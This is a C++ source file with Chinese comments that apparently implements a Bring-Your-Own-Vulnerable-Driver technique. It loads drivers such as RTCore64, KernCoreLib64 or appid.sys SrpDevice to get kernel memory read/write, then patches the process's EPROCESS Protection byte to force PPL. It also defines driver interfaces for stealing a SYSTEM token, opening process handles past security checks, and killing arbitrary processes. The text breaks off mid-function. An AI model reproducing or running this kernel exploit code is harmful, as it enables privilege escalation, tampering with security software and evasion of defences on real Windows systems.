// Architect: tzdwindows 7
// process_protect: 强制启用 PPL via BYOVD — 完整实现
//
// 链路:
//   1. SCM 加载 .sys 内核驱动 (需管理员)
//   2. 打开驱动设备句柄
//   3. NtQuerySystemInformation(SystemModuleInformation) 找 ntoskrnl 基址
//   4. LoadLibraryEx(ntoskrnl.exe, DONT_RESOLVE) 解析内核导出 RVA
//   5. 用驱动 R/W 读 PsGetProcessProtection 字节 → 动态提取 Protection 偏移
//   6. 用驱动 R/W 读 PsGetProcessId 字节 → 动态提取 UniqueProcessId 偏移
//   7. ActiveProcessLinks = UniqueProcessId + 8
//   8. 读 PsInitialSystemProcess → System EPROCESS (PID=4)
//   9. 沿 ActiveProcessLinks.Flink 走链表, 匹配 PID → 本进程 EPROCESS
//  10. 写 EPROCESS + Protection_offset = 0xC1 (WinTcb ProtectedLight)
//  11. 读回验证 + NtQueryInformationProcess(ProcessProtectionInformation)
#include "process_protect.h"
#include <psapi.h>
#include <cstring>
#include <cstdio>
#include <cstdarg>
#include <cstdlib>

#ifdef _MSC_VER
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#endif

static void log_msg(const char* fmt, ...) {
    char buf[512];
    va_list ap; va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "[TZD-PP] %s\n", buf);
    fflush(stderr);
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 全局状态 ────────────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static struct {
    bool          driver_loaded;      // SCM 加载成功
    char          service_name[64];   // SCM 服务名
    SC_HANDLE     scm;                // SCManager 句柄
    SC_HANDLE     svc;                // 服务句柄
    HANDLE        device;             // 驱动设备句柄
    int           driver_type;        // TZD_DRIVER_*
    // 通用驱动 IOCTL 配置
    char          gen_device[128];
    unsigned int  gen_read_ioctl;
    unsigned int  gen_write_ioctl;
    // 运行时解析结果
    unsigned long long ntoskrnl_base;     // 内核中 ntoskrnl 基址
    unsigned int  protection_offset;   // EPROCESS.Protection 偏移
    unsigned int  unique_pid_offset;  // EPROCESS.UniqueProcessId 偏移
    unsigned int  active_links_offset;// EPROCESS.ActiveProcessLinks 偏移
    unsigned long long ps_initial_system_process; // 内核地址
    unsigned long long our_eprocess;  // 本进程 EPROCESS 地址
    unsigned char current_protection; // 当前保护字节
    char          status[2048];       // 状态 JSON
} g_pp;

// appid.sys SrpDevice 利用模式状态
static struct {
    HANDLE  section_handle;          // NtCreateSection 句柄
    void*   user_mapping;            // 用户态映射基址
    unsigned long long section_size; // section 大小
    unsigned long long kernel_mapping_base; // 内核态映射基址 (0=未映射)
    unsigned char ioctl_in_buf[4096];
    unsigned char ioctl_out_buf[4096];
} g_appid;

// KernCoreLib64.sys 物理内存映射状态
static struct {
    void*              map_base_va;  // 物理内存用户态映射基址 (单次映射 [0xFC000800, RAM))
    unsigned long long map_size;      // 映射大小
    unsigned long long eproc_map_va;  // 本进程 EPROCESS 在映射视图中的地址 (patch 用)
    unsigned long long eproc_phys;    // 本进程 EPROCESS 物理地址
} g_kc;

// 调用者提供的 hole-free RAM 物理范围 (可选; 为空则经 PCI BAR 自动推算 — 见 kerncore_compute)
struct KernCoreRamRange { unsigned long long base; unsigned long long len; };
#define KC_MAX_RAM_RANGES 64
static KernCoreRamRange g_kc_ram[KC_MAX_RAM_RANGES];
static int g_kc_ram_count = 0;

// 设备 MMIO 范围 (PCI memory BAR; 扫描时跳过 → 绝不读设备寄存器 → 不会卡死总线)
struct KernCoreMmioRange { unsigned long long base; unsigned long long len; };
#define KC_MAX_MMIO 256
static KernCoreMmioRange g_kc_mmio[KC_MAX_MMIO];
static int g_kc_mmio_count = 0;

// NtCreateSection / NtMapViewOfSection 声明
typedef LONG (NTAPI *NtCreateSection_t)(PHANDLE, ACCESS_MASK, void*, PLARGE_INTEGER,
                                         ULONG, ULONG, HANDLE);
typedef LONG (NTAPI *NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
                                            SIZE_T, PLARGE_INTEGER, PSIZE_T,
                                            DWORD, DWORD, ULONG);
static NtCreateSection_t    pNtCreateSection = nullptr;
static NtMapViewOfSection_t pNtMapViewOfSection = nullptr;

// ═══════════════════════════════════════════════════════════════════════
// ─── NtQuerySystemInformation 内部声明 ──────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

typedef LONG (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
static NtQuerySystemInformation_t pNtQuerySystemInformation = nullptr;

typedef LONG (NTAPI *NtQueryInformationProcess_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
static NtQueryInformationProcess_t pNtQueryInformationProcess = nullptr;

// SystemModuleInformation = 11
#pragma pack(push, 8)
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;        // ← 内核中模块基址
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;
#pragma pack(pop)

#define SystemModuleInformation 11

// ProcessProtectionInformation = 0x3D (61)
#define ProcessProtectionInformation 0x3D

static void resolve_ntdll_funcs() {
    if (!pNtQuerySystemInformation) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            pNtQuerySystemInformation = (NtQuerySystemInformation_t)
                GetProcAddress(ntdll, "NtQuerySystemInformation");
            pNtQueryInformationProcess = (NtQueryInformationProcess_t)
                GetProcAddress(ntdll, "NtQueryInformationProcess");
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
// ─── SeDebugPrivilege 启用 ───────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static bool enable_debug_privilege() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return false;
    LUID luid;
    if (!LookupPrivilegeValueA(nullptr, "SeDebugPrivilege", &luid)) {
        CloseHandle(token);
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(token);
    if (!ok) {
        log_msg("AdjustTokenPrivileges(SeDebug) failed err=%lu", GetLastError());
        return false;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        log_msg("SeDebugPrivilege NOT assigned — need admin");
        return false;
    }
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 1. SCM 驱动加载 ──────────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

static bool driver_load(const char* sysPath, const char* svcName) {
    g_pp.scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!g_pp.scm) {
        log_msg("OpenSCManager failed err=%lu (need admin)", GetLastError());
        return false;
    }
    // 同名服务可能已存在 (上次失败残留 / 已运行) → 先尝试复用
    g_pp.svc = OpenServiceA(g_pp.scm, svcName, SERVICE_ALL_ACCESS);
    if (g_pp.svc) {
        SERVICE_STATUS ss;
        if (QueryServiceStatus(g_pp.svc, &ss) && ss.dwCurrentState == SERVICE_RUNNING) {
            log_msg("driver service '%s' already running — reusing", svcName);
            g_pp.driver_loaded = true;
            return true;
        }
        // 已存在但未运行 → 删除后重建
        ControlService(g_pp.svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(g_pp.svc);
        CloseServiceHandle(g_pp.svc);
        g_pp.svc = nullptr;
        Sleep(200);
    }
    // 路径可能含非 ASCII 字符 (如中文 "秒杀") → 必须用宽字符 API。
    //   CreateServiceA/GetFullPathNameA 是 ANSI, 会把 UTF-8 中文路径编码错误
    //   → StartService err=3 (PATH_NOT_FOUND)。
    //   修复: UTF-8 → UTF-16 → GetFullPathNameW → CreateServiceW → StartServiceW。
    wchar_t wSysPath[MAX_PATH];
    int wLen = MultiByteToWideChar(CP_UTF8, 0, sysPath, -1, wSysPath, MAX_PATH);
    if (wLen == 0) {
        // 回退: 直接用 ANSI
        wLen = MultiByteToWideChar(CP_ACP, 0, sysPath, -1, wSysPath, MAX_PATH);
    }
    wchar_t wAbsPath[MAX_PATH];
    if (!GetFullPathNameW(wSysPath, MAX_PATH, wAbsPath, nullptr)) {
        wcsncpy(wAbsPath, wSysPath, MAX_PATH - 1);
        wAbsPath[MAX_PATH - 1] = 0;
    }
    // 服务名也转宽字符
    wchar_t wSvcName[64];
    MultiByteToWideChar(CP_UTF8, 0, svcName, -1, wSvcName, 64);

    g_pp.svc = CreateServiceW(
        g_pp.scm, wSvcName, wSvcName,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        wAbsPath, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!g_pp.svc) {
        // 183=ALREADY_EXISTS / 1072=MARKED_DELETE / 1058=DISABLED → 复用已有服务
        DWORD e = GetLastError();
        if (e == 183 || e == 1072 || e == 1058) {
            g_pp.svc = OpenServiceW(g_pp.scm, wSvcName, SERVICE_ALL_ACCESS);
        }
    }
    if (!g_pp.svc) {
        log_msg("CreateService failed err=%lu path=%S", GetLastError(), wAbsPath);
        CloseServiceHandle(g_pp.scm);
        g_pp.scm = nullptr;
        return false;
    }
    if (!StartServiceW(g_pp.svc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            log_msg("StartService failed err=%lu (driver blocked? HVCI/blocklist?)", err);
            // 常见原因: 驱动签名无效 / 易受攻击驱动阻止列表 / HVCI 开启
            SERVICE_STATUS ss;
            ControlService(g_pp.svc, SERVICE_CONTROL_STOP, &ss);
            DeleteService(g_pp.svc);
            CloseServiceHandle(g_pp.svc); g_pp.svc = nullptr;
            CloseServiceHandle(g_pp.scm); g_pp.scm = nullptr;
            return false;
        }
    }
    log_msg("driver service '%s' started (path=%S)", svcName, wAbsPath);
    g_pp.driver_loaded = true;
    return true;
}

static void driver_unload_internal() {
    // 1. 先关设备句柄 — 确保驱动 unload 时无未关闭句柄 (防止 BSOD)
    //    旧版顺序反了 (先停服务 → 触发 unload → 此时设备句柄仍打开 → 竞态)
    if (g_pp.device && g_pp.device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_pp.device); g_pp.device = INVALID_HANDLE_VALUE;
    }
    // 2. 仅当我们通过 SCM 加载了服务时才停/删 (g_pp.svc != nullptr)
    //    若驱动已预加载 (设备已打开但 svc 为空), 只关句柄, 不碰 SCM
    if (g_pp.svc) {
        SERVICE_STATUS ss;
        ControlService(g_pp.svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(g_pp.svc);
        CloseServiceHandle(g_pp.svc); g_pp.svc = nullptr;
    }
    if (g_pp.scm) { CloseServiceHandle(g_pp.scm); g_pp.scm = nullptr; }
    g_pp.driver_loaded = false;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 2. 驱动设备打开 + IOCTL R/W 协议 ─────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// RTCore64 协议 (来自公开逆向):
//   设备: \\.\RTCore64
//   IOCTL 0x80002050 = 读内存
//   IOCTL 0x80002048 = 写内存
//   输入结构: { BYTE size; BYTE pad[3]; DWORD pad2; ULONG64 addr; ULONG64 value; }
//   读: size=8, addr=目标, value 忽略; 输出结构里 value 字段是读到的值
//   写: size=8, addr=目标, value=要写的值
#define RTCORE_DEVICE   "\\\\.\\RTCore64"
#define RTCORE_READ     0x80002050
#define RTCORE_WRITE    0x80002048

// 自定义 tzd_ppl_drv.sys 协议 (见 native/driver/tzd_ppl_drv.c):
//   设备: \\.\TzdPpl
//   IOCTL 0x80002000 = 读内核虚拟内存
//     输入: { ULONG64 addr; ULONG size; }
//     输出: 读取的数据 (size 字节, 写入同一缓冲区)
//   IOCTL 0x80002004 = 写内核虚拟内存
//     输入: { ULONG64 addr; ULONG size; BYTE data[size]; }
//   ── 新增内核原语 (PPL 增强) ──
//   IOCTL 0x80002008 = 内核强制打开进程句柄 (绕过所有安全检查)
//   IOCTL 0x8000200C = 按 PID 直接设置 PPL
//   IOCTL 0x80002010 = 按 PID 查询 PPL
//   IOCTL 0x80002014 = 内核终止任意进程
//   IOCTL 0x80002018 = Token 窃取 (提权到 SYSTEM)
#define CUSTOM_DEVICE        "\\\\.\\TzdPpl"
#define CUSTOM_READ           0x80002000
#define CUSTOM_WRITE          0x80002004
#define CUSTOM_OPEN_PROCESS   0x80002008
#define CUSTOM_SET_PPL        0x8000200C
#define CUSTOM_QUERY_PPL      0x80002010
#define CUSTOM_KILL_PROCESS   0x80002014
#define CUSTOM_STEAL_TOKEN    0x80002018

// ── 反 shellcode / ETW-TI / systrace / 进程保护 IOCTL (镜像 tzd_ppl_drv.c) ──
#define CUSTOM_SET_MONITOR_PID    0x8000201C
#define CUSTOM_SCAN_SYSCALLS     0x80002020
#define CUSTOM_PROTECT_PID       0x80002024
#define CUSTOM_UNPROTECT_PID     0x80002028
#define CUSTOM_ARM_SC_DEFENSE    0x8000202C
#define CUSTOM_DISARM_SC_DEFENSE 0x80002030
#define CUSTOM_QUERY_SC_STATS    0x80002034
#define CUSTOM_ARM_ETW_TI        0x80002038
#define CUSTOM_DISARM_ETW_TI     0x8000203C
#define CUSTOM_QUERY_ALERT       0x80002040
#define CUSTOM_ARM_SYSTRACE      0x80002044
#define CUSTOM_DISARM_SYSTRACE   0x80002048
#define CUSTOM_ARM_HYPERVISOR    0x8000204C
#define CUSTOM_DISARM_HYPERVISOR 0x80002050
// ── JIT 代码缓存写保护 (EPT-based) ──
#define CUSTOM_REGISTER_JIT_RANGE 0x80002054
#define CUSTOM_SET_JVM_WRITER      0x80002058
#define CUSTOM_QUERY_JIT_ALERT     0x8000205C
#define CUSTOM_CLEAR_JIT_RANGES    0x80002060

// SE_SIGNING_LEVEL 常量 (SET_PPL 用)
#define TZD_SE_SIGNING_LEVEL_WINDOWS_TCB 0x0E
#define TZD_SE_SIGNING_LEVEL_ANTIMALWARE 0x0F

// appid.sys SrpDevice 协议 (见 docs/DRIVER_VULN_SCAN.md):
//   设备: \\.\SrpDevice (appid.sys 已加载, 无需 SCM)
//   IOCTL 0x225804 = SrpVerifyDll (无 PreviousMode 检查!)
//     入口: AipDeviceIoControlDispatch → SrpVerifyDll
//     SrpVerifyDll 接收 IRP->RequestorMode 作为参数 (未在dispatch层检查)
//     导入有 MmMapViewOfSection / ZwCreateSection / ZwOpenProcess
//   策略: 通过 SrpVerifyDll 触发 section 映射 → 获得内核 R/W
#define APPID_SRP_DEVICE  "\\\\.\\SrpDevice"
#define APPID_VERIFY_IOCTL 0x225804
// SrpVerifyDll 的 IOCTL 输入布局 (通过逆向推测):
//   [0..3]   ULONG  Size/Flags
//   [4..7]   ULONG  Reserved
//   [8..N]   WCHAR  DllPath (验证目标 DLL 路径)
// 输出: 验证结果 + 可能的 section 基址
// 注: 精确布局需动态分析确认; 这里先探测
#define APPID_APPID_DEVICE "\\\\.\\AppID"
#define APPID_APPID_IOCTL  0x22A014  // 有 PreviousMode 检查 (CVE-2024-21338 已修补)

// ═══════════════════════════════════════════════════════════════════════
// ─── KernCoreLib64.sys 协议 (github.com/readmsr/MSI_FeatureManager_CVE) ──
//   设备: \\.\WinIo (KernCoreLib64.sys 创建, 兼容经典 WinIo 接口)
//   IOCTL 0x80102040 = 映射物理内存到用户空间 (size 无校验, 可映射整段物理内存)
//   IOCTL 0x80102044 = 取消映射
//   输入/输出: KernCoreMapRequest { size; phys_addr; section_handle; section_base_va; section_object_ptr; }
//   策略: 映射物理内存 → 暴力扫描定位本进程 EPROCESS → 直接 patch Protection 字节
//   注: 与 RTCore64/自定义驱动的"内核虚拟 R/W"路径不同 — 此驱动只给物理内存映射,
//       故不走 NtQuerySystemInformation+ntoskrnl 导出链, 而是物理内存扫描定位 EPROCESS
// ═══════════════════════════════════════════════════════════════════════
#define KERNCORE_DEVICE       "\\\\.\\WinIo"
#define IOCTL_MAP_PHYS_MEM    0x80102040
#define IOCTL_UNMAP_PHYS_MEM  0x80102044
#define IOCTL_READ_IO_PORT    0x80102050
#define IOCTL_WRITE_IO_PORT   0x80102054
#define KERNCORE_PHYS_BASE     0xFC000800ULL  // 驱动 bound check 下限 (参考 PoC 取值)

// Windows 11 23H2 (build 22631) EPROCESS 偏移 — 用于物理内存扫描定位
// (IDA 验证: ida_out/ntoskrnl_eprocess.txt + ppl_common.h)
//   PsGetProcessId:                 mov rax,[rcx+440h]   → UniqueProcessId  = 0x440
//   ActiveProcessLinks (= UniquePid + 8, LIST_ENTRY)                          = 0x448
//   PsGetProcessCreateTimeQuadPart: mov rax,[rcx+468h]   → CreateTime       = 0x468
//   PsGetProcessImageFileName:      lea rax,[rcx+5A8h]   → ImageFileName     = 0x5A8
//   KPROCESS.DirectoryTableBase (CR3, EPROCESS 首 0x28 字节为 KPROCESS)       = 0x028
//   PsGetProcessProtection: 8A 81 7A 08 00 00 C3 → Protection              = 0x87A
#define KC_UNIQUEPID_OFFSET     0x440ULL
#define KC_ACTIVELINKS_OFFSET   0x448ULL
#define KC_CREATETIME_OFFSET    0x468ULL
#define KC_IMAGEFILENAME_OFFSET 0x5A8ULL
#define KC_DIRECTORYBASE_OFFSET 0x028ULL
#define KC_PROTECTION_OFFSET    0x87AU
// 校验常量: Flink/Token 在内核地址空间 (高16位=0xFFFF); CreateTime 合理区间 (≈2015..2100)
#define KC_FLINK_KERNEL_HI      0xFFFF000000000000ULL
#define KC_TS_MIN               130645056000000000ULL
#define KC_TS_MAX               160000000000000000ULL

#pragma pack(push, 1)
struct RtcMemOp {
    unsigned char  size;        // 0
    unsigned char  pad1[3];     // 1-3
    unsigned int   pad2;        // 4-7
    unsigned long long addr;   // 8-15
    unsigned long long value;   // 16-23
};

// 自定义驱动协议结构
struct CustomKmemOp {
    unsigned long long addr;   // 0-7
    unsigned int   size;        // 8-11
    unsigned char  data[12];    // 12+ (足够 8 字节 + 对齐)
};

// ── 新增: 内核原语 IOCTL 结构 (与 tzd_ppl_drv.c 对齐) ──

// 内核强制打开进程句柄
struct CustomOpenProcReq {
    unsigned long  pid;             // 目标 PID
    unsigned int   desiredAccess;   // 请求的访问权限
};
struct CustomOpenProcRsp {
    void*        handle;            // 返回的句柄
    long         status;            // NTSTATUS
};

// 按 PID 设置 PPL
struct CustomSetPplReq {
    unsigned long  pid;           // 目标 PID
    unsigned char  protection;    // PS_PROTECTION 字节
    unsigned char  sigLevel;      // SignatureLevel (0=不改)
    unsigned char  reserved[2];
};

// 按 PID 查询 PPL
struct CustomQueryPplReq {
    unsigned long  pid;
};
struct CustomQueryPplRsp {
    unsigned char  protection;
};

// 内核终止进程
struct CustomKillReq {
    unsigned long  pid;
    long           exitStatus;    // NTSTATUS
};

// Token 窃取
struct CustomStealTokenReq {
    unsigned long  targetPid;
    unsigned long  sourcePid;     // 0 = System (PID=4)
};

// ── 反 shellcode / ETW-TI / systrace / 进程保护 IOCTL 结构 (与 tzd_ppl_drv.c 对齐) ──

// 设置 syscall 扫描监控 PID
struct CustomSetMonitorReq {
    unsigned long  pid;
};

// 扫描结果
struct CustomScanResult {
    unsigned long  hits;          // 发现的 syscall stub 数
    unsigned long  nxBlocked;     // 已中和页数
    unsigned long  reserved[2];
};

// 事件驱动进程保护
struct CustomProtectPidReq {
    unsigned long  pid;
};

// 反 shellcode 防御武装
struct CustomScDefenseReq {
    unsigned long  pid;
};

// 反 shellcode 累计统计
struct CustomScResult {
    unsigned long  scans;         // 周期扫描次数
    unsigned long  pagesNx;       // 累计 NX 阻断页数
    unsigned long  threadsSeen;   // 检测到的新线程数
    unsigned long  imagesSeen;    // 检测到的镜像加载数
    unsigned long  unsignedImgs;  // 无签名镜像数
    unsigned long  filelessPe;    // 无文件 PE 命中区段数
    unsigned long  etwTiEnabled;  // Reserved[0]: ETW-TI 主方案状态
    unsigned long  reserved;
};

// 告警 (扫描发现 shellcode)
struct CustomScAlert {
    unsigned long       compromised;      // 1 = 已发现 shellcode
    unsigned long       childBlocked;     // 阻断的可疑子进程数
    unsigned long       lastShellcodeType; // 最近命中类型
    unsigned long       creatorThreadId;  // 创建者 TID
    unsigned long long lastShellcodeVa;  // 最近 shellcode 命中 VA
};

// JIT 代码缓存写保护 IOCTL 结构 (镜像 tzd_ppl_drv.c TZD_JIT_*)
struct CustomJitRangeReq {
    unsigned long       pid;             // 目标进程 PID (附着走页表用)
    unsigned long       reserved;
    unsigned long long  base;            // JIT GVA 基址
    unsigned long long  size;            // JIT GVA 大小
};
struct CustomJvmWriterReq {
    unsigned long long  jvmBase;         // jvm.dll/java.exe 代码段基址
    unsigned long long  jvmSize;         // jvm.dll/java.exe 代码段大小
};
struct CustomJitAlert {
    unsigned long       jitTampered;     // 1 = 检测到非 JVM 写 JIT
    unsigned long       jitBlocks;       // 累计阻止写次数
    unsigned long       jitAllows;       // 累计允许 JVM 写次数
    unsigned long       jitRangeCount;   // 已注册 JIT 范围数
    unsigned long long  tamperRip;       // 被阻止写者的 RIP
    unsigned long long  tamperVa;        // 被写的 JIT GVA
};

// KernCoreLib64.sys 映射物理内存 IOCTL 的输入/输出结构 (参考 phys_mem.cpp)
struct KernCoreMapRequest {
    unsigned long long size;              // 映射大小 (ZwMapViewOfSection arg7, 驱动无校验)
    unsigned long long phys_addr;        // 物理地址 (驱动 bound check 下限 = 0xFC000800)
    void*              section_handle;   // [out] 驱动填充: section 句柄
    unsigned long long section_base_va;  // [out] 驱动填充: 用户态映射基址
    void*              section_object_ptr;// [out] 驱动填充: 内部 section 对象指针
};

// KernCoreLib64.sys 读写 I/O 端口 IOCTL 的输入/输出结构 (参考 io_port.cpp)
struct KcPortReadReq  { unsigned short port; unsigned short pad0; unsigned short pad1; char size; };
struct KcPortWriteReq { unsigned short port; unsigned int   value; char size; };
#pragma pack(pop)

static bool driver_open_device() {
    const char* devName = RTCORE_DEVICE;
    if (g_pp.driver_type == TZD_DRIVER_GENERIC && g_pp.gen_device[0])
        devName = g_pp.gen_device;
    else if (g_pp.driver_type == TZD_DRIVER_CUSTOM)
        devName = CUSTOM_DEVICE;
    else if (g_pp.driver_type == TZD_DRIVER_APPID)
        devName = APPID_SRP_DEVICE;
    else if (g_pp.driver_type == TZD_DRIVER_KERNCORE)
        devName = KERNCORE_DEVICE;
    g_pp.device = CreateFileA(devName, GENERIC_READ | GENERIC_WRITE,
                              0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_pp.device == INVALID_HANDLE_VALUE) {
        log_msg("CreateFile(%s) failed err=%lu", devName, GetLastError());
        return false;
    }
    log_msg("driver device opened: %s handle=%p", devName, g_pp.device);
    return true;
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 2b. 内核 R/W (多协议分发) ────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════

// RTCore64 读 8 字节
static bool rtc_read8(unsigned long long addr, unsigned long long* out) {
    RtcMemOp op; memset(&op, 0, sizeof(op));
    op.size = 8; op.addr = addr;
    DWORD ret = 0;
    if (!DeviceIoControl(g_pp.device, RTCORE_READ,
                          &op, sizeof(op), &op, sizeof(op), &ret, nullptr) || ret < sizeof(op))
        return false;
    *out = op.value;
    return true;
}

// RTCore64 写 1 字节
static bool rtc_write1(unsigned long long addr, unsigned char val) {
    RtcMemOp op; memset(&op, 0, sizeof(op));
    op.size = 1; op.addr = addr; op.value = val;
    DWORD ret = 0;
    return DeviceIoControl(g_pp.device, RTCORE_WRITE,
                           &op, sizeof(op), &op, sizeof(op), &ret, nullptr) != FALSE;
}

// 自定义驱动读 N 字节 (输出写到 input buffer 同一 SystemBuffer)
static bool custom_read(unsigned long long addr, void* buf, unsigned int size) {
    CustomKmemOp op; memset(&op, 0, sizeof(op));
    op.addr = addr; op.size = size;
    DWORD ret = 0;
    // METHOD_BUFFERED: input=output=同一个 SystemBuffer
    // 驱动把读到的数据写到 buffer 前面
    if (!DeviceIoControl(g_pp.device, CUSTOM_READ,
                          &op, sizeof(op), &op, sizeof(op), &ret, nullptr))
        return false;
    if (ret < size) return false;
    memcpy(buf, op.data, size);
    return true;
}

// 自定义驱动写 N 字节
static bool custom_write(unsigned long long addr, const void* buf, unsigned int size) {
    CustomKmemOp op; memset(&op, 0, sizeof(op));
    op.addr = addr; op.size = size;
    if (size > sizeof(op.data)) return false;
    memcpy(op.data, buf, size);
    DWORD ret = 0;
    return DeviceIoControl(g_pp.device, CUSTOM_WRITE,
                           &op, sizeof(op), &op, sizeof(op), &ret, nullptr) != FALSE;
}

// 内核读 8 字节 (按驱动类型分发)
static bool kread8(unsigned long long addr, unsigned long long* out) {
    if (!g_pp.device || g_pp.device == INVALID_HANDLE_VALUE) return false;
    if (g_pp.driver_type == TZD_DRIVER_APPID) {
        // appid 模式: 通过共享 section 间接读
        if (!g_appid.kernel_mapping_base || !g_appid.user_mapping) return false;
        unsigned long long off = addr - g_appid.kernel_mapping_base;
        if (off + 8 > g_appid.section_size) return false;
        *out = *(unsigned long long*)((char*)g_appid.user_mapping + off);
        return true;
    }
    if (g_pp.driver_type == TZD_DRIVER_CUSTOM) {
        return custom_read(addr, out, 8);
    }
    // RTCore64 / GENERIC(用 RTCore64 结构)
    unsigned long long v = 0;
    if (g_pp.driver_type == TZD_DRIVER_GENERIC) {
        RtcMemOp op; memset(&op, 0, sizeof(op));
        op.size = 8; op.addr = addr;
        DWORD ret = 0;
        if (!DeviceIoControl(g_pp.device, g_pp.gen_read_ioctl,
                              &op, sizeof(op), &op, sizeof(op), &ret, nullptr) || ret < sizeof(op))
            return false;
        *out = op.value;
        return true;
    }
    if (!rtc_read8(addr, &v)) return false;
    *out = v;
    return true;
}

// 内核读 1 字节
static bool kread1(unsigned long long addr, unsigned char* out) {
    if (g_pp.driver_type == TZD_DRIVER_CUSTOM) {
        unsigned long long v = 0;
        if (!custom_read(addr, &v, 1)) return false;
        *out = (unsigned char)(v & 0xFF);
        return true;
    }
    unsigned long long v = 0;
    if (!kread8(addr, &v)) return false;
    *out = (unsigned char)(v & 0xFF);
    return true;
}

// 内核写 1 字节
static bool kwrite1(unsigned long long addr, unsigned char val) {
    if (!g_pp.device || g_pp.device == INVALID_HANDLE_VALUE) return false;
    if (g_pp.driver_type == TZD_DRIVER_CUSTOM) {
        return custom_write(addr, &val, 1);
    }
    if (g_pp.driver_type == TZD_DRIVER_APPID) {
        // appid 模式: 通过共享 section 间接写
        // (见 appid_probe_and_map; 内核映射基址存在 g_pp 中)
        if (!g_appid.kernel_mapping_base) return false;
        unsigned long long off = addr - g_appid.kernel_mapping_base;
        if (off >= g_appid.section_size) return false;
        ((unsigned char*)g_appid.user_mapping)[off] = val;
        return true;
    }
    if (g_pp.driver_type == TZD_DRIVER_GENERIC) {
        RtcMemOp op; memset(&op, 0, sizeof(op));
        op.size = 1; op.addr = addr; op.value = val;
        DWORD ret = 0;
        return DeviceIoControl(g_pp.device, g_pp.gen_write_ioctl,
                               &op, sizeof(op), &op, sizeof(op), &ret, nullptr) != FALSE;
    }
    return rtc_write1(addr, val);
}

// ═══════════════════════════════════════════════════════════════════════
// ─── 2c. appid.sys SrpDevice 利用模式 ─────────────────────────────────────
// appid.sys 已加载, 无需 SCM。策略:
//   1. 创建一个 section (NtCreateSection, PAGE_READWRITE)
//   2. MapViewOfFile 映射到用户空间 (g_appid.user_mapping)
//   3. 打开 \\.\SrpDevice, 发 IOCTL 0x225804 让 SrpVerifyDll
//      把 section 映射到内核空间 (MmMapViewInSystemSpace)
//   4. 内核映射基址 → g_appid.kernel_mapping_base
//   5. 用户态写 user_mapping → 同步反映到 kernel_mapping → 内核 R/W
// ═══════════════════════════════════════════════════════════════════════
// g_appid + NtCreateSection/NtMapViewOfSection 在文件头部声明

static void resolve_section_funcs() {
    if (!pNtCreateSection) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            pNtCreateSection = (NtCreateSection_t)
                GetProcAddress(ntdll, "NtCreateSection");
            pNtMapViewOfSection = (NtMapViewOfSection_t)
                GetProcAddress(ntdll, "NtMapViewOfSection");
        }
    }
}

// 创建共享 section 并映射到用户空间
static bool appid_create_section(unsigned long long size) {
    resolve_section_funcs();
    if (!pNtCreateSection || !pNtMapViewOfSection) {
        log_msg("appid: NtCreateSection/NtMapViewOfSection not found");
        return false;
    }
    LARGE_INTEGER secSize;
    secSize.QuadPart = size;
    g_appid.section_size = size;
    LONG st = pNtCreateSection(&g_appid.section_handle,
                                SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_QUERY,
                                nullptr, &secSize, PAGE_READWRITE, SEC_COMMIT, nullptr);
    if (st < 0) {
        log_msg("appid: NtCreateSection failed status=0x%lx", st);
        return false;
    }
    // 映射到当前进程
    SIZE_T viewSize = size;
    g_appid.user_mapping = nullptr;
    st = pNtMapViewOfSection(g_appid.section_handle, (HANDLE)-1,
                              &g_appid.user_mapping, 0, 0, nullptr,
                              &viewSize, 1 /*ViewShare*/, 0, PAGE_READWRITE);
    if (st < 0) {
        log_msg("appid: NtMapViewOfSection failed status=0x%lx", st);
        CloseHandle(g_appid.section_handle);
        g_appid.section_handle = nullptr;
        return false;
    }
    log_msg("appid: section created handle=%p user_mapping=%p size=0x%llx",
